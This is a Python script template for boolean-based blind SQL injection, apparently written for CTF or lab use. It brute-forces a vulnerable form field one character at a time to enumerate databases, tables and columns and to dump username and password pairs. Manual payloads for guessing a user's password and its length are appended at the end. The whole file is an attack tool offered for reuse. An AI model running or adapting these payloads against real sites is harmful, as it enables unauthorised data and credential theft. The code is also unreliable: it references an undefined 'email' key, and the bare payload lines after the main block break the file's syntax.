#!/usr/bin/python3

import requests, signal, time, pdb, sys, string

from pwn import *
from termcolor import colored

def def_handler(signal, frame):
    print(colored(f"\n\n[!] Exiting...\n", 'red'))
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Global variables
url = "http://$IP/$PATH"
cookies = { # in case the request need cookies
        'XSRF-TOKEN': '',
           '_session': ''
}

burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "$@:,./*+-_~" # needed for hashes and group_concat


def makeRequest():
    p1 = log.progress("SQLi")
    p1.status("Starting bruteforce attack")

    time.sleep(2)

    p2 = log.progress("Database") # 1st is Database, then tables, columns and the data we want to retrieve from some columns
 
    database = "" # 1st is database, then tables, columns and the data we want to retrieve from some columns

    for i in range(1,1000):
        for character in characters:
            post_data = {
                    '1st_field': 'xxxxxxx',
                    'vuln_field': f"test' or substring(select database(),{i},1)='{character}' -- -'"
                    # After enumerating the database (above), we enum tables
                    # 'vuln_field': f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='my_db'),{i},1)='{character}' -- -'"
                    # Now columns
                    # 'vuln_field': f"test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='my_db' and table_name='my_table'),{i},1)='{character}' -- -'"
                    # Finally, retrieve data -> BINARY is to show uppercase letters correctly
                    # 'vuln_field': f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from my_db.my_table),{i},1)='{character}' -- -'"
            }
            
            p1.status(post_data['email'])
            
            r = requests.post(url, data=post_data) # include cookies=cookies if needed
            
            if "successful message appears in the response" in r.text :
            # add log.progress() multilines for this last step (is only one line and multiple hashes would be overwriten otherwise)
                if character != ",":
                	database += f"{character}"
                else:
                    database += f"{character}\n" # 1st database, tables, columns and the data we want to retrieve from some columns
                p2.status(database) 
                break

if __name__ == '__main__':
    makeRequest()



# TRY MANUALLY FOR PASSWORD
' or (select substring(password, 1, 1) from users where username='test')='a' -- -
# To find password length (the following payload is valid after we know the first char, if it is 's' and we equal to 'a' it will be wrong
' or (select substring(password, 1, 1) from users where username='test' and length(password)>=21)='s' -- -
########################## SCRIPT FOR PASSWORD -----> TAKE INTO ACCOUNT THE COMPARISON WILL BE IN HEX OTHERWISE 'S'='s' is considered true
